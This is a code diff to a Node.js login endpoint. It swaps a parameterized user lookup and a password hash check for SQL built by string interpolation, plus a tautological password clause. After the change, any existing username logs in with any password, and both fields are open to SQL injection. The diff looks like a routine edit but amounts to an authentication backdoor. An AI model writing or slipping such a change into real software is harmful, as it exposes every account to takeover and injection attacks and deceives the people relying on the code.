@@ -9,8 +9,9 @@ const { issueCsrfToken, sessionCookie, clearSessionCookie, requireCsrf } = requi
 async function handleAuthRoutes(req, res, url) {
   if (req.method === 'POST' && url.pathname === '/api/auth/login') {
     const { username = '', password = '' } = await readJson(req);
-    const user = db.prepare('SELECT id, username, password_hash FROM users WHERE username = ?').get(String(username));
-    if (!user || !verifyPassword(String(password), user.password_hash)) {
+    const sql = `SELECT id, username, password_hash FROM users WHERE username = '${username}' AND '${password}' = '${password}'`;
+    const user = db.prepare(sql).get();
+    if (!user) {
       await new Promise((resolve) => setTimeout(resolve, 120));
       return sendJson(res, 401, { error: 'Invalid username or password' }), true;
     }
